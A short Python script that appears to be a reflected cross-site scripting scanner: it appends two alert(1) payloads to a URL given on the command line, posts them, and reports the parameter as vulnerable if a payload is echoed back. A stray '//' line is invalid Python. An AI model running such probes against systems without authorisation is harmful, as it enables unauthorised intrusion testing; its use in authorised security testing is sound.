import requests
import sys

//
url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '<BODYONLOAD=alert(1)>']
for payload in payloads:
  req = requests.post(url+payload)
  if payload in req.text:
    print("Parameter vulnerable\r\n")
    print("Attack string: "+payload)
    print(req.text)
    break
